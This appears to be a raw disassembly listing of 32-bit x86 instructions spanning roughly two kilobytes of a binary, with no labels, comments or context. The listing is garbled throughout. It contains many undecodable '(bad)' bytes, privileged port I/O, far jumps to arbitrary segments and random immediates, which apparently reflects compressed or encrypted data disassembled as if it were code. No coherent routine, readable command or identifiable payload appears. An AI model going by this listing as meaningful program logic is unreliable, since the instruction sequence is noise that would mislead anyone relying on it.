  413a05:	sub    bh,ch
  413a07:	push   es
  413a08:	mov    es,WORD PTR [edx-0x6050deea]
  413a0e:	js     0x413a2d
  413a10:	xor    BYTE PTR [edx+ebx*4-0x15cc6e5],ah
  413a17:	cmp    ch,BYTE PTR [ecx-0x200261d0]
  413a1d:	mov    al,BYTE PTR [edi+ebp*1+0x1b2e0f63]
  413a24:	jae    0x413a99
  413a26:	loopne 0x413a13
  413a28:	add    al,0x85
  413a2a:	add    DWORD PTR [eax+0x26],ecx
  413a2d:	mov    cl,ah
  413a2f:	mov    ebp,0xc980b23c
  413a34:	mov    ds:0x5c1e2610,al
  413a39:	aam    0x9d
  413a3b:	adc    bl,cl
  413a3d:	dec    edx
  413a3e:	xchg   esp,eax
  413a3f:	scas   eax,DWORD PTR es:[edi]
  413a40:	in     eax,dx
  413a41:	lock xchg ebx,eax
  413a43:	xchg   ebx,eax
  413a44:	jecxz  0x413a97
  413a46:	fwait
  413a47:	jne    0x413a9d
  413a49:	inc    ecx
  413a4a:	aaa    
  413a4b:	mov    bl,0x18
  413a4d:	cmc    
  413a4e:	mov    WORD PTR [esi+0x7c06ef25],fs
  413a54:	sub    eax,0x7082030e
  413a59:	and    BYTE PTR [ecx+edx*8+0x20],al
  413a5d:	adc    BYTE PTR [esi-0x4d],ch
  413a60:	and    eax,0x57e063b4
  413a65:	lock push esi
  413a67:	adc    bh,BYTE PTR [ebp+0x2a]
  413a6a:	sbb    cl,BYTE PTR [edx-0x64]
  413a6d:	jmp    0x41e2:0xc53bc62f
  413a74:	sub    BYTE PTR gs:[ebx-0x7707d4a],bl
  413a7b:	outs   dx,DWORD PTR ds:[esi]
  413a7c:	iret   
  413a7d:	dec    ebx
  413a7e:	clc    
  413a7f:	in     al,dx
  413a80:	and    dh,BYTE PTR [edi+edx*4+0x6d]
  413a84:	jp     0x413ac1
  413a86:	xor    eax,0xd2227c95
  413a8c:	push   esi
  413a8d:	jns    0x413a33
  413a8f:	(bad)  
  413a90:	rcl    DWORD PTR [edx+0x73],1
  413a93:	mov    edi,0xf3acb459
  413a98:	mov    ah,BYTE PTR [edi-0x3c]
  413a9b:	test   al,0x80
  413a9d:	stc    
  413a9e:	(bad)  
  413a9f:	xlat   BYTE PTR ds:[ebx]
  413aa0:	xor    BYTE PTR [eax],bh
  413aa2:	in     al,0x20
  413aa4:	jo     0x413ad0
  413aa6:	mov    bl,0x8c
  413aa8:	lds    ebx,FWORD PTR [ebp-0x2d]
  413aab:	int3   
  413aac:	and    bl,BYTE PTR [esi]
  413aae:	mov    ds:0x5a12f265,al
  413ab3:	(bad)  
  413ab4:	jmp    DWORD PTR ds:0xcbcd8580
  413aba:	jb     0x413aa2
  413abc:	pop    esp
  413abd:	adc    DWORD PTR [edx-0x36],ebx
  413ac0:	cmp    eax,0x6d935d60
  413ac5:	(bad)  
  413ac7:	xor    ebx,DWORD PTR ds:0xd7eec157
  413acd:	sub    BYTE PTR [edx+0x7888cf08],ah
  413ad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ad4:	jo     0x413aef
  413ad6:	xor    ecx,0x480662f8
  413adc:	push   edx
  413add:	pop    es
  413ade:	imul   esp,DWORD PTR [eax+0x2f],0x58d54345
  413ae5:	xchg   bl,bl
  413ae7:	addr16 gs jl 0x413a75
  413aeb:	cmp    dl,al
  413aed:	xor    BYTE PTR [ebx-0x1c],al
  413af0:	jo     0x413b5d
  413af2:	loopne 0x413b69
  413af4:	jne    0x413afd
  413af6:	cmp    al,0x47
  413af8:	jno    0x413a8d
  413afa:	sahf   
  413afb:	add    eax,0x31e71592
  413b00:	xchg   edx,eax
  413b01:	mov    WORD PTR [eax-0xd],gs
  413b04:	gs dec edx
  413b06:	jno    0x413b55
  413b08:	sub    al,0x3f
  413b0a:	shr    bh,1
  413b0c:	mov    ecx,0xfe8171c1
  413b11:	fcom   st(1)
  413b13:	std    
  413b14:	stos   DWORD PTR es:[edi],eax
  413b15:	xor    eax,0x1f76a27b
  413b1a:	push   edx
  413b1b:	hlt    
  413b1c:	inc    edi
  413b1d:	mov    dh,0x89
  413b1f:	pusha  
  413b20:	mov    ecx,0xdb562271
  413b25:	jnp    0x413ba3
  413b27:	jmp    0x8356f5f4
  413b2c:	addr16 xchg ebx,eax
  413b2e:	pop    ebp
  413b2f:	or     eax,0xfc648249
  413b34:	sti    
  413b35:	mov    ebx,0xdd56bcea
  413b3a:	inc    DWORD PTR [esi-0x63]
  413b3d:	mov    BYTE PTR [edi-0x6e],ah
  413b40:	pop    esi
  413b41:	leave  
  413b42:	test   BYTE PTR [ecx-0x18],bh
  413b45:	inc    eax
  413b46:	or     BYTE PTR [edi-0x21],dl
  413b49:	jmp    0x413b88
  413b4b:	jmp    0x5fe6:0x823184ed
  413b52:	and    BYTE PTR ds:0xfec1a295,bh
  413b58:	les    ecx,FWORD PTR ds:[ecx+ecx*8+0x3e]
  413b5d:	js     0x413aec
  413b5f:	cmp    eax,0xf03c4390
  413b64:	jmp    0x2479:0xf12bc66d
  413b6b:	ds ins DWORD PTR es:[edi],dx
  413b6d:	fdivr  DWORD PTR [ecx]
  413b6f:	outs   dx,BYTE PTR ds:[esi]
  413b70:	adc    al,0x6c
  413b72:	shl    DWORD PTR [ebx-0x36bc3c52],cl
  413b78:	mov    edx,0x863816bf
  413b7d:	(bad)  
  413b7f:	iret   
  413b80:	shl    BYTE PTR [edi-0x21],0xbf
  413b84:	sbb    al,0x78
  413b86:	pop    ecx
  413b87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b88:	and    cl,BYTE PTR [edx-0xb]
  413b8b:	retf   
  413b8c:	in     al,dx
  413b8d:	mov    bh,0xc8
  413b8f:	push   0x38bcde2c
  413b94:	or     ch,BYTE PTR [eax-0x42]
  413b97:	xchg   edx,eax
  413b98:	push   es
  413b99:	push   ebx
  413b9a:	adc    cl,bl
  413b9c:	xchg   ebp,eax
  413b9d:	dec    ebx
  413b9e:	push   0xe7bbf82a
  413ba3:	aad    0xc9
  413ba5:	sbb    BYTE PTR [esi+esi*8+0x62],0xcd
  413baa:	cld    
  413bab:	add    DWORD PTR [ebx-0x63240ab4],0x4c
  413bb2:	mov    cs,WORD PTR [edi]
  413bb4:	mov    ds,WORD PTR [ebx]
  413bb6:	aam    0x84
  413bb8:	clc    
  413bb9:	and    eax,0xf23d80b3
  413bbe:	in     al,0x44
  413bc0:	xchg   ebx,eax
  413bc1:	inc    ecx
  413bc2:	fidiv  WORD PTR [edi]
  413bc4:	ds lock pop eax
  413bc7:	jmp    0xc186cd3
  413bcc:	or     ecx,0xffffffcd
  413bcf:	pusha  
  413bd0:	repz mov dh,0xeb
  413bd3:	lea    ecx,[edi]
  413bd5:	scas   al,BYTE PTR es:[edi]
  413bd6:	mov    edx,0xc7aed2a9
  413bdb:	out    dx,al
  413bdc:	repz int3 
  413bde:	inc    ecx
  413bdf:	retf   0x71e2
  413be2:	inc    esi
  413be3:	lods   al,BYTE PTR ds:[esi]
  413be4:	(bad)  
  413be5:	mov    ebp,0xf385c818
  413bea:	push   esi
  413beb:	mov    ebx,0x6f4c
  413bf0:	aaa    
  413bf1:	mov    esp,0x1a8cc1d0
  413bf6:	retf   0x1fa7
  413bf9:	stc    
  413bfa:	(bad)  
  413bfb:	xchg   esp,eax
  413bfc:	pop    edi
  413bfd:	rcr    DWORD PTR [edi+0x43412b72],cl
  413c03:	and    BYTE PTR [ebx-0x58ffd085],ch
  413c09:	pop    esi
  413c0a:	add    eax,0x443cbc69
  413c0f:	dec    ebp
  413c10:	mov    DWORD PTR [ebp+ebp*2-0x6513077c],0xc3f13e88
  413c1b:	push   es
  413c1c:	dec    edi
  413c1d:	fdivr  QWORD PTR [esp+eiz*4-0x582695e7]
  413c24:	and    cl,cl
  413c26:	je     0x413c6e
  413c28:	retf   0xc147
  413c2b:	out    dx,al
  413c2c:	pop    ds
  413c2d:	sub    BYTE PTR [ebx],0x66
  413c30:	xchg   esi,eax
  413c31:	pop    ebx
  413c32:	cmp    al,0xf4
  413c34:	outs   dx,DWORD PTR ds:[esi]
  413c35:	jmp    0x413bcb
  413c37:	push   edx
  413c38:	jle    0x413c57
  413c3a:	sub    ch,cl
  413c3c:	and    ecx,ebp
  413c3e:	xchg   edx,eax
  413c3f:	loope  0x413c52
  413c41:	das    
  413c42:	sbb    eax,0xa8dd1a59
  413c47:	mov    al,ds:0xf66893d8
  413c4c:	clc    
  413c4d:	push   ebx
  413c4e:	ret    
  413c4f:	aam    0xa8
  413c51:	stos   BYTE PTR es:[edi],al
  413c52:	mov    BYTE PTR [esi-0x23],0x73
  413c56:	(bad)  
  413c57:	outs   dx,BYTE PTR ds:[esi]
  413c58:	jge    0x413be7
  413c5a:	ins    BYTE PTR es:[edi],dx
  413c5b:	inc    ebx
  413c5c:	xchg   ebx,eax
  413c5d:	aas    
  413c5e:	push   esp
  413c5f:	cmp    DWORD PTR [edi+0x11],esp
  413c62:	movd   mm6,ecx
  413c65:	jge    0x413cbe
  413c67:	leave  
  413c68:	jnp    0x413c39
  413c6a:	test   al,0x21
  413c6c:	or     al,0xc9
  413c6e:	mov    DWORD PTR [ebp+0x79c8e1ae],ecx
  413c74:	sar    BYTE PTR [edx-0x6f],cl
  413c77:	setne  BYTE PTR [edi+0x3c]
  413c7b:	cmp    al,0x33
  413c7d:	sub    BYTE PTR [edi+0x6025fd3],0x97
  413c84:	clc    
  413c85:	jmp    0xe537:0x937ad47b
  413c8c:	xor    eax,0xde8d8ff9
  413c91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c92:	and    ecx,DWORD PTR [edx-0x75]
  413c95:	into   
  413c96:	outs   dx,BYTE PTR ds:[esi]
  413c97:	(bad)  
  413c98:	mov    ch,0xf4
  413c9a:	test   al,0x8b
  413c9c:	arpl   WORD PTR [esi-0xd],ax
  413c9f:	mov    ebx,0x453081c6
  413ca4:	arpl   si,ax
  413ca6:	test   DWORD PTR [ebp+0x1f],edi
  413ca9:	pushf  
  413caa:	fbld   TBYTE PTR [ebp+0x2a39b6af]
  413cb0:	dec    ebx
  413cb1:	ror    BYTE PTR [esi-0x4b],cl
  413cb4:	and    ebx,esp
  413cb6:	ficomp WORD PTR [edi]
  413cb8:	pop    ebx
  413cb9:	sbb    al,0x20
  413cbb:	mov    ch,0xbd
  413cbd:	add    BYTE PTR [esi+0x65c4892a],dl
  413cc3:	nop
  413cc4:	aad    0x93
  413cc6:	aad    0xdb
  413cc8:	cmc    
  413cc9:	xchg   DWORD PTR [ebp+0x7c],esp
  413ccc:	mov    cl,0x6b
  413cce:	test   DWORD PTR [ecx],0xa5fb07f0
  413cd4:	stos   DWORD PTR es:[edi],eax
  413cd5:	neg    DWORD PTR [ecx+0x77]
  413cd8:	pop    ebp
  413cd9:	adc    BYTE PTR [eax-0x5ebd5314],0x24
  413ce0:	(bad)
  413ce4:	mov    dh,al
  413ce6:	mov    ah,0x9
  413ce8:	or     ebx,DWORD PTR ds:0x7b2ef606
  413cee:	addr16 rcl dh,cl
  413cf1:	jp     0x413cfb
  413cf3:	xchg   ecx,eax
  413cf4:	mov    ebp,0x247c67fe
  413cf9:	cdq    
  413cfa:	sub    eax,esi
  413cfc:	js     0x413cc6
  413cfe:	cmc    
  413cff:	iret   
  413d00:	cs pop esp
  413d02:	jmp    0x413c86
  413d04:	xchg   edi,eax
  413d05:	mov    ch,0xd9
  413d07:	dec    ecx
  413d08:	pop    ebp
  413d09:	adc    eax,0x2364a262
  413d0e:	pusha  
  413d0f:	hlt    
  413d10:	pop    eax
  413d11:	mov    BYTE PTR [ebx-0x11],ah
  413d14:	pop    esp
  413d15:	int    0xdf
  413d17:	xor    BYTE PTR [ebp-0x3e],al
  413d1a:	out    0xe8,eax
  413d1c:	push   ebx
  413d1d:	or     BYTE PTR [esi],dl
  413d1f:	icebp  
  413d20:	leave  
  413d21:	cli    
  413d22:	fcom   DWORD PTR [edx]
  413d24:	leave  
  413d25:	ret    0x8cd8
  413d28:	add    al,0xf
  413d2a:	mov    dl,0x25
  413d2c:	out    dx,al
  413d2d:	sub    BYTE PTR [esi+0x7d99dd],bl
  413d33:	sbb    BYTE PTR [ebp+0x7aa4374e],dh
  413d39:	(bad)  
  413d3a:	fdivrp st(0),st
  413d3c:	push   0xcffa2028
  413d41:	pop    edx
  413d42:	mov    esi,0xf019f85f
  413d47:	cmc    
  413d48:	imul   ebx,DWORD PTR [esi+0x627971f0],0xffffffab
  413d4f:	dec    edi
  413d50:	std    
  413d51:	rol    BYTE PTR [di-0x65],cl
  413d55:	lock gs push edx
  413d58:	sub    BYTE PTR es:[ebx+0x5d],bh
  413d5c:	add    BYTE PTR [edi+0x16],dl
  413d5f:	and    al,0xd4
  413d61:	popa   
  413d62:	lods   eax,DWORD PTR ds:[esi]
  413d63:	jae    0x413d51
  413d65:	xor    al,BYTE PTR [edx+eiz*1+0x4828bfbc]
  413d6c:	xor    BYTE PTR [ebp-0x22ebbfa1],cl
  413d72:	add    DWORD PTR [ebx-0x5b0c514],eax
  413d78:	sub    ebp,DWORD PTR [ebp+edi*8-0x5900f819]
  413d7f:	rcl    BYTE PTR [eax+edi*4-0x5e],cl
  413d83:	push   ss
  413d84:	das    
  413d85:	jne    0x413d27
  413d87:	jbe    0x413db1
  413d89:	xchg   DWORD PTR [edx],ecx
  413d8b:	xor    bl,BYTE PTR [ebx-0x79]
  413d8e:	imul   esi
  413d90:	sub    al,0x75
  413d92:	cmp    al,0xc6
  413d94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d95:	pop    ecx
  413d96:	lea    edx,ds:0x8d85b573
  413d9c:	mov    ch,0x1a
  413d9e:	shr    BYTE PTR [edx+eax*1+0x4352700b],0x9f
  413da6:	push   0x6a9c331
  413dab:	imul   eax,DWORD PTR [eax+ecx*1],0xae66f9ba
  413db2:	fprem1 
  413db4:	pushf  
  413db5:	mov    al,0xb0
  413db7:	sub    BYTE PTR [esi],0x1a
  413dba:	cmp    edx,DWORD PTR [edx+ebx*8+0x75550c1b]
  413dc1:	mov    ecx,ebx
  413dc3:	shl    DWORD PTR [ebp-0x4462561e],0x98
  413dca:	jp     0x413daa
  413dcc:	add    DWORD PTR ds:[edx-0x262bbaf6],edx
  413dd3:	lods   al,BYTE PTR ds:[esi]
  413dd4:	push   0x6c
  413dd6:	pop    esp
  413dd7:	fadd   DWORD PTR [edi]
  413dd9:	xchg   DWORD PTR [eax-0x3d],edi
  413ddc:	cmp    ch,bh
  413dde:	lods   eax,DWORD PTR ds:[esi]
  413ddf:	adc    al,ah
  413de1:	sub    esi,DWORD PTR [ebp-0x15af3ac2]
  413de7:	shl    DWORD PTR [edi+0xe],cl
  413dea:	adc    dh,BYTE PTR [ecx]
  413dec:	cmc    
  413ded:	ds jg  0x413e3c
  413df0:	jne    0x413d76
  413df2:	add    BYTE PTR [edx-0x3682aafb],0x66
  413df9:	js     0x413def
  413dfb:	xor    al,0x96
  413dfd:	icebp  
  413dfe:	jnp    0x413dcc
  413e00:	std    
  413e01:	adc    bh,ch
  413e03:	shl    DWORD PTR [esi-0x1d1f722c],cl
  413e09:	hlt    
  413e0a:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  413e0c:	(bad)  
  413e0d:	sbb    ebx,ecx
  413e0f:	and    eax,0xc6e1873
  413e14:	int3   
  413e15:	rcr    bl,1
  413e17:	nop
  413e18:	jg     0x413df1
  413e1a:	(bad)  
  413e1b:	pop    es
  413e1c:	xchg   ebx,eax
  413e1d:	jne    0x413db5
  413e1f:	cwde   
  413e20:	xor    dh,0xbe
  413e23:	inc    ebp
  413e24:	ins    BYTE PTR es:[edi],dx
  413e25:	pop    esp
  413e26:	and    edi,esi
  413e28:	cmp    eax,0xb2d475ef
  413e2d:	lock loop 0x413e14
  413e30:	(bad)  
  413e31:	je     0x413e4c
  413e33:	lahf   
  413e34:	xor    eax,0x49024325
  413e39:	push   esi
  413e3a:	fimul  DWORD PTR [eax+0x20]
  413e3d:	shr    DWORD PTR [esi],0xbf
  413e40:	xor    DWORD PTR [ebp-0x35bb2bc9],esp
  413e46:	mov    ds:0x5c782e02,eax
  413e4b:	jne    0x413eb2
  413e4d:	push   ss
  413e4e:	je     0x413e37
  413e50:	dec    ecx
  413e51:	sub    DWORD PTR ds:0xb29f4478,ecx
  413e57:	push   ebp
  413e58:	mov    ch,0x67
  413e5a:	jle    0x413e69
  413e5c:	pop    edi
  413e5d:	sti    
  413e5e:	mov    dh,0x11
  413e60:	jb     0x413ecd
  413e62:	(bad)
  413e67:	scas   eax,DWORD PTR es:[edi]
  413e68:	inc    eax
  413e69:	outs   dx,DWORD PTR ds:[esi]
  413e6a:	dec    esp
  413e6b:	lea    eax,[edx+0x21741be8]
  413e71:	pop    edi
  413e72:	data16 adc bl,BYTE PTR [ecx-0x67]
  413e76:	sbb    DWORD PTR [ebx],eax
  413e78:	in     eax,dx
  413e79:	add    DWORD PTR [ebx-0x666372ab],esp
  413e7f:	(bad)  
  413e81:	pop    ds
  413e82:	(bad)  
  413e83:	or     cl,BYTE PTR [edx-0xb]
  413e86:	clc    
  413e87:	mov    DWORD PTR [esi-0x63fd6056],esp
  413e8d:	xor    edx,ebx
  413e8f:	and    al,0xa2
  413e91:	xchg   esp,eax
  413e92:	pushf  
  413e93:	sub    eax,0x630d47c6
  413e98:	mov    bl,0x93
  413e9a:	push   es
  413e9b:	cmc    
  413e9c:	mov    ebx,0xa9bcbfa2
  413ea1:	fstp   DWORD PTR [ebp-0x5e]
  413ea4:	jne    0x413e3e
  413ea6:	inc    ebp
  413ea7:	pusha  
  413ea8:	gs ds push esp
  413eab:	xchg   esi,eax
  413eac:	mov    dh,0xab
  413eae:	xchg   esp,eax
  413eaf:	mov    bl,0x1b
  413eb1:	xchg   ecx,esp
  413eb3:	adc    ah,BYTE PTR [ebp+0x2d6cf4c6]
  413eb9:	aas    
  413eba:	pop    esi
  413ebb:	sub    eax,0xedd034fa
  413ec0:	data16 inc ah
  413ec3:	xor    BYTE PTR [eax],cl
  413ec5:	loop   0x413e8e
  413ec7:	sar    DWORD PTR [esi],1
  413ec9:	sar    DWORD PTR [edi+0x63],cl
  413ecc:	stos   DWORD PTR es:[edi],eax
  413ecd:	pop    ebx
  413ece:	mov    edi,ds
  413ed0:	outs   dx,DWORD PTR ds:[esi]
  413ed2:	and    ebx,edi
  413ed4:	retf   
  413ed5:	bound  ebx,QWORD PTR [eax-0x4cad6ac9]
  413edb:	sub    al,0x4e
  413edd:	(bad)  
  413ede:	cmp    BYTE PTR [ebx-0x1],dl
  413ee1:	inc    edi
  413ee2:	mov    bl,0xb5
  413ee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ee5:	push   edi
  413ee6:	xchg   ebp,eax
  413ee7:	fstp   DWORD PTR [esi+0x5b22bcd0]
  413eed:	dec    ebx
  413eee:	inc    ebp
  413eef:	sub    DWORD PTR [edx],0x155bc9b6
  413ef5:	test   BYTE PTR [esi-0x2e3c04a8],0xd7
  413efc:	fadd   QWORD PTR [edx-0x1b]
  413eff:	adc    DWORD PTR ds:0x3c50882,eax
  413f05:	(bad)  
  413f06:	cwde   
  413f07:	mov    al,ds:0x2d3fa745
  413f0c:	push   ds
  413f0d:	mov    ds:0xd872f4df,al
  413f12:	mov    edx,DWORD PTR [ebx+0x75]
  413f15:	add    dh,BYTE PTR fs:[edx+0x5c]
  413f19:	loopne 0x413ef4
  413f1b:	jno    0x413eee
  413f1d:	dec    edx
  413f1e:	or     ah,dh
  413f20:	std    
  413f21:	mov    edi,0xc16f5d07
  413f26:	mov    DWORD PTR ds:0x67857506,0x992737d6
  413f30:	addr16 mov al,ds:0x1bdb
  413f34:	mov    ds:0x8e5ab41f,al
  413f39:	sub    DWORD PTR [ecx],esp
  413f3b:	jecxz  0x413f0a
  413f3d:	jp     0x413ed2
  413f3f:	int    0x81
  413f41:	nop
  413f42:	pop    esp
  413f43:	ds std 
  413f45:	outs   dx,DWORD PTR ds:[esi]
  413f46:	shl    DWORD PTR [ecx],1
  413f48:	fwait
  413f49:	lods   al,BYTE PTR ds:[esi]
  413f4a:	iret   
  413f4b:	aaa    
  413f4c:	mov    bl,0x5c
  413f4e:	cmp    DWORD PTR [eax+ebp*2+0x5d],edx
  413f52:	pop    edx
  413f53:	sub    DWORD PTR [edi-0x6633390],0x70a57610
  413f5d:	rcr    cl,0x24
  413f60:	inc    ecx
  413f61:	pusha  
  413f62:	pop    ds
  413f63:	jae    0x413fb5
  413f65:	lahf   
  413f66:	jmp    0xb20:0xd8a389b1
  413f6d:	dec    esp
  413f6e:	dec    ebx
  413f6f:	outs   dx,BYTE PTR ds:[esi]
  413f70:	scas   al,BYTE PTR es:[edi]
  413f71:	mov    ebp,0x798f632c
  413f76:	adc    BYTE PTR [esi+0x35f4a769],dh
  413f7c:	and    ebp,ebx
  413f7e:	je     0x413f92
  413f80:	clc    
  413f81:	daa    
  413f82:	push   edi
  413f83:	shl    edi,0xaf
  413f86:	ja     0x413f7f
  413f88:	popa   
  413f89:	and    BYTE PTR [esi-0x71],bh
  413f8c:	popf   
  413f8d:	idiv   BYTE PTR [esi]
  413f8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f90:	lea    ebp,[edx-0x34]
  413f93:	ja     0x414014
  413f95:	jae    0x413fc8
  413f97:	xchg   edx,eax
  413f98:	push   0xebdabbbe
  413f9d:	sbb    eax,0xa6137b94
  413fa2:	push   cs
  413fa3:	push   es
  413fa4:	js     0x413fea
  413fa6:	add    ebx,DWORD PTR [eax-0x32c412cd]
  413fac:	inc    ebp
  413fad:	jp     0x413f34
  413faf:	mov    cl,0xe
  413fb1:	add    eax,0xb6284fda
  413fb6:	and    DWORD PTR [edx+0x3041aa2f],esp
  413fbc:	jnp    0x413fa8
  413fbe:	sar    DWORD PTR [eax],cl
  413fc0:	push   0x1b95f1de
  413fc5:	dec    ecx
  413fc6:	push   ebp
  413fc7:	test   DWORD PTR [ecx-0x2b43197],ebp
  413fcd:	jg     0x413fea
  413fcf:	push   0x266bb92c
  413fd4:	mov    ebp,0x6c1cd75f
  413fd9:	icebp  
  413fda:	cmp    al,0x74
  413fdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fdd:	jmp    0x41404b
  413fdf:	inc    esp
  413fe0:	and    eax,0x358314b9
  413fe5:	popf   
  413fe6:	sub    DWORD PTR [ebx-0x402cf7b0],edx
  413fec:	icebp  
  413fed:	cmp    esp,eax
  413fef:	fldenv [eax+edi*4-0x40]
  413ff3:	cwde   
  413ff4:	xchg   edi,eax
  413ff5:	inc    edi
  413ff6:	jo     0x41400b
  413ff8:	ds lock push esi
  413ffb:	jmp    0xa2ad9ec0
  414000:	das    
  414001:	pop    ebp
  414002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414003:	dec    ebp
  414004:	jg     0x413fee
  414006:	imul   eax,ebx,0x6b
  414009:	lds    ebx,FWORD PTR [eax+0xf]
  41400c:	fist   WORD PTR [esi+esi*8-0x7b8c2e79]
  414013:	jmp    0x413ff9
  414015:	adc    eax,0x35c2aacd
  41401a:	inc    ebx
  41401b:	ret    0xa40
  41401e:	in     eax,0xe5
  414020:	je     0x413fd9
  414022:	or     DWORD PTR [ebx+0x31a66af],0xffffff8d
  414029:	add    BYTE PTR [ebp-0x112653db],0xdd
  414030:	mov    ebx,0xf4ee93d1
  414035:	(bad)  
  414036:	jnp    0x414070
  414038:	or     dl,BYTE PTR [edi-0x5a59b7f8]
  41403e:	les    eax,FWORD PTR es:[edi-0x20019529]
  414045:	dec    edi
  414046:	and    edi,0x13
  414049:	fimul  WORD PTR [ebx]
  41404b:	jmp    0xde83:0xa3e7c4c5
  414052:	pusha  
  414053:	in     al,0x7b
  414055:	inc    eax
  414056:	sahf   
  414057:	rcr    cl,0x7e
  41405a:	aaa    
  41405b:	ret    0xb85b
  41405e:	loope  0x41405e
  414060:	test   BYTE PTR [edi],0x6c
  414063:	lds    ebp,FWORD PTR [ebx]
  414065:	loope  0x414056
  414067:	mov    eax,0x5e5a5843
  41406c:	lods   al,BYTE PTR ds:[esi]
  41406d:	outs   dx,DWORD PTR ds:[esi]
  41406e:	lock mov bl,0xe1
  414071:	(bad)  
  414073:	xchg   esp,eax
  414074:	test   eax,0x759d8c34
  414079:	jnp    0x41405f
  41407b:	pop    esi
  41407c:	cdq    
  41407d:	rcr    BYTE PTR [eax],cl
  41407f:	cs lahf 
  414081:	call   0x815994ef
  414086:	ret    
  414087:	pop    ds
  414088:	mov    al,0xa0
  41408a:	xor    eax,0x4573a381
  41408f:	pusha  
  414090:	jp     0x4140d2
  414092:	mov    ch,0x91
  414094:	fisubr DWORD PTR [esi+ebp*1]
  414097:	sub    al,0x92
  414099:	push   es
  41409a:	in     eax,0xce
  41409c:	sub    BYTE PTR gs:[ebp+0x43],dh
  4140a0:	mov    ch,0xc2
  4140a2:	jecxz  0x414072
  4140a4:	mov    esi,0x31293469
  4140a9:	xchg   edx,eax
  4140aa:	or     DWORD PTR [eax-0x1f],ebp
  4140ad:	jnp    0x414073
  4140af:	add    al,0xd
  4140b1:	dec    ecx
  4140b2:	jne    0x414107
  4140b4:	call   0xfbaf:0x81eea7c0
  4140bb:	push   0xfffffff7
  4140bd:	xor    eax,0x589c2937
  4140c2:	retf   
  4140c3:	(bad)  
  4140c4:	mov    ch,0x65
  4140c6:	add    ch,BYTE PTR [ecx-0x26a6f392]
  4140cc:	popa   
  4140cd:	out    dx,eax
  4140ce:	jae    0x41405e
  4140d0:	mov    bh,BYTE PTR [ebp+0x61]
  4140d3:	pop    ds
  4140d4:	scas   al,BYTE PTR es:[edi]
  4140d5:	ja     0x4140cb
  4140d7:	std    
  4140d8:	xor    cl,BYTE PTR [ecx+0x1f]
  4140db:	loopne 0x41414b
  4140dd:	push   esp
  4140de:	xchg   ecx,eax
  4140df:	jge    0x4140e1
  4140e1:	sub    dh,bl
  4140e3:	inc    ebx
  4140e4:	fdecstp 
  4140e6:	shl    DWORD PTR [ecx-0x1cfccf09],1
  4140ec:	push   ebp
  4140ed:	jle    0x41408d
  4140ef:	adc    BYTE PTR fs:[esi-0x29],dl
  4140f3:	add    DWORD PTR [edi-0x40],eax
  4140f6:	mov    edi,0x734ac49
  4140fb:	cli    
  4140fc:	outs   dx,BYTE PTR ds:[esi]
  4140fd:	out    dx,al
  4140fe:	pop    esp
  4140ff:	cmp    eax,0xf469f434
  414104:	pop    ss
  414105:	iret   
  414106:	xor    ch,BYTE PTR [eax+0x53]
  414109:	in     al,dx
  41410a:	or     bl,dl
  41410c:	pop    ecx
  41410d:	inc    edx
  41410e:	or     al,0xff
  414110:	imul   eax,DWORD PTR [edi+0x62a3bbcd],0x5ffeb976
  41411a:	pop    ecx
  41411b:	fcomp  QWORD PTR [edx-0x22]
  41411e:	jle    0x4140f9
  414120:	rol    DWORD PTR [esp+esi*2+0x43],cl
  414124:	inc    esp
  414125:	adc    dl,BYTE PTR ds:0xfe01327a
  41412b:	ret    0x2833
  41412e:	cdq    
  41412f:	lahf   
  414130:	dec    edx
  414131:	cmp    BYTE PTR [ebx],ch
  414133:	fwait
  414134:	jl     0x41416d
  414136:	jle    0x414160
  414138:	adc    DWORD PTR [ebx+0x42dd425d],0xfffffff7
  41413f:	mov    ebp,0x60c8f257
  414144:	out    dx,eax
  414145:	neg    BYTE PTR [eax+ecx*4+0x6ec18a3f]
  41414c:	ins    BYTE PTR es:[edi],dx
  41414d:	pop    edi
  41414e:	xor    al,0x2
  414150:	fcomip st,st(2)
  414152:	js     0x414160
  414154:	sub    DWORD PTR [ebp+0x7c],ebx
  414157:	xchg   ebp,eax
  414158:	or     BYTE PTR ds:0xa452e54,ah
  41415e:	cdq    
  41415f:	push   eax
  414160:	cmp    eax,0xc25a54a5
  414165:	jns    0x4141c4
  414167:	pop    edi
  414168:	lds    esp,FWORD PTR [ebp+0x67]
  41416b:	mov    dl,0x96
  41416d:	test   BYTE PTR [eax+ebx*8],bl
  414170:	in     eax,0x9a
  414172:	push   esi
  414173:	jmp    0x4141de
  414175:	xchg   BYTE PTR [edx],bl
  414177:	pop    ecx
  414178:	loop   0x4141a6
  41417a:	jecxz  0x414179
  41417c:	int    0xbf
  41417e:	mov    ds:0x5584f4a4,al
  414183:	sbb    al,0x64
  414185:	repnz sbb DWORD PTR [ecx-0x68bda52e],ebp
  41418c:	es ror dl,0x8f
  414190:	mov    ebx,0x91fa314a
  414195:	push   edi
  414196:	or     al,0x92
  414198:	bswap  ebp
  41419a:	xor    eax,0x4efe0e82
  41419f:	adc    esp,DWORD PTR ds:0xb6868d31
  4141a5:	pop    ebx
  4141a6:	fwait
  4141a7:	inc    edx
  4141a8:	xchg   esi,eax
  4141a9:	push   0xc
  4141ab:	outs   dx,DWORD PTR ds:[esi]
  4141ac:	nop
  4141ad:	jg     0x4141f2
  4141af:	lds    esi,FWORD PTR [ecx]
  4141b1:	fs jbe 0x4141bc
  4141b4:	jge    0x4141dd
  4141b6:	xchg   esp,eax
  4141b7:	xor    DWORD PTR [esi],esi
  4141b9:	out    dx,al
  4141ba:	jbe    0x41418d
  4141bc:	inc    ebp
  4141bd:	jle    0x4141ae
  4141bf:	cmp    DWORD PTR [ebp+0x793ce583],ebx
  4141c5:	push   ds
  4141c6:	adc    BYTE PTR [edi],al
  4141c8:	inc    ebp
  4141c9:	xchg   edi,eax
  4141ca:	or     DWORD PTR [edx-0x1c],eax
  4141cd:	mov    edx,0x66839ad6
  4141d2:	js     0x414201
  4141d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141d5:	rcl    DWORD PTR [edi+edx*8-0x62aab854],0x2a
